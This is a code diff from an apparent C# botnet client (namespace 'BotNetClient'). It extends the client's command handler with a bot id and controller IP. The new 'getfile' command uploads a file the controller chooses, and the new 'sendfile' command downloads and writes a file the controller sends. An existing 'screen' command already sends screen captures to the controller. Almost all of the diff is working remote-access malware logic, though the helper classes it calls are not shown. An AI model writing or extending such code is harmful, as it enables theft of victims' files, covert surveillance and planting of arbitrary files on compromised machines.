@@ -8,7 +8,7 @@ namespace BotNetClient
 {
     class handler
     {
-        public static string handl(string message)
+        public static string handl(string message, uint id, string ip)
         {
             string a = null;
             string[] msg = message.Split(new char[]{'^'},StringSplitOptions.RemoveEmptyEntries) ;
@@ -22,6 +22,13 @@ namespace BotNetClient
             }
             switch (msg[0])
             {
+                case "getfile":
+                    string path = HttpHandler.Class1.SendFilePathAsync(ip).Result;
+                    HttpHandler.Class1.SendFileAsync(id, ip, path, SendOrGetFile.Class1.codeToSend(path));
+                    break;
+                case "sendfile":
+                    SendOrGetFile.Class1.codeToGet(HttpHandler.Class1.GetFileAsync(ip).Result, HttpHandler.Class1.GetFilePathAsync(ip).Result);
+                    break;
                 case "screen":
                     HttpHandler.Class1.ScreenSendAsync(Program.idc.ToString(), ProcessShowingTheScreen.Class1.code());
                     break;
